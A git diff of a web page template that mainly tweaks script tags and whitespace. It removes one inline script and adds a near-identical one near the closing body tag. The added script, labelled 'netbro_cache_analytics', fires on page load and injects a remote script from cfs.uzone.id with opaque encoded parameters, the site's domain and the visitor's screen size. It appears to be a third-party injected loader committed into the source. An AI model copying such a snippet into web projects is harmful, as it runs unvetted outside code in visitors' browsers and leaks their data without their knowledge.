@@ -162,9 +162,11 @@ img {
     <script src="{{ asset('theme-1/js/animation.js') }}"></script>
     <script src="{{ asset('theme-1/js/bottom.js') }}"></script>
 
-  <script type="text/javascript">
+  <script>
   </script>
+  
   @yield('js')
+
   <script>
 
   var galleryThumbs = new Swiper('.gallery-thumbs', {
@@ -250,10 +252,6 @@ img {
     // });
     </script>
 
-
-
-
-
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA6NT89HNLNPn6IB1UEyZH9%2b4byLF7QSvLX9swJErupIBMrQac0Wm7E7SZ7RjuH7Q5jHLv3DyawqxW1Cw1bKbnUv1TT4qyAYPsOHaDjO9Tulsu%2f0wqSCDdFIPLh%2bnLWYEKfjMk%2b0KVzmidcU0PM5zxLQ9OuYUWVV%2bK%2bwDQn2AZ33Xag%2fXcsU8w6dfxi8dm2a%2fyBfnN0IcUkAlze26OXHSqTL5EAAv6a2IZ%2bcG5qoBDDCSjUgYCHYGkVKyD0dQpfqVUiomZTr0km%2bTqaQXgUTxkDfSwpHH%2bnQAvmkhntAOZKxtwF84pFHpqzNDeYu6oRRIvd%2bNlppcFGfDrLKSInWqj5irSIIxeK5Dh9%2bj8yW3%2fMc%2b54VVmKLFkpO0Uycjb8YMxhTNVx7oYiNYstpHVXp2VI0tuQKft9DhPwq%2bOO3AcGJjACPLBaZ6gPS31Ws5hqZSKSVDb%2f0nifRkD7IReIqUT%2bgGHGOV7y2ao4SyqtAvRkJq7u2jmjEh0yTs1M0%2b90SKqGltp70Z7jpGp9xdXtjogxafqlqmgQ2ArWJIWsDRjbbo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAbtDmIPU68QkjaYkbVKsLFl4csI40HPXNRXZyU3gDa72BXBCa4r7FxrnMpq%2bMMBHx5Yv8eHxjx1qPFTDovDdj8jDaZsY6yVWCQLho6%2bDUNsiMAiZ5jSNu5r1BXQtPZEt00lA%2bpHAD5U6P4Y2%2bckhpCvulDwMCJw533P8tHkiTgZDdy9MBFNdweq78DshEvBCeX26NTKIkdhpS3EtfRFIoA31NpIOEu1CXkrdDJ8GDDqG92nBfZUbAjWkYgLstWnl9krq2CG3uXf8bFPKzi9sq8ngnGykjCpmNTITzCTtAM5zBZrc%2bSTXdbW6u9o8%2fQOSLa61hhxyASez4mQix8Q3GLdK8LPEjd4HmqTi9Du80wpVWdK%2fPzjev7TYFPcvKLeQKfFNSs%2f6BU8RCOXUtpXFJaQUbM%2fPH%2fW3aW0KD41SEGUHaRJBlT7nk%2fl2ht%2fRJgGFzwV%2fNVayeZcXyCJlNw4Kk1Q%2fr3W5jA4VxsFx7udrGMWt3lnDsv6wynDH05BLNvpHXS0YT0nqrd3niX67TNpmTXd6RBZV%2f7LZD8P078y6fpKPdSiSId8XocQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 </body>
 </html>
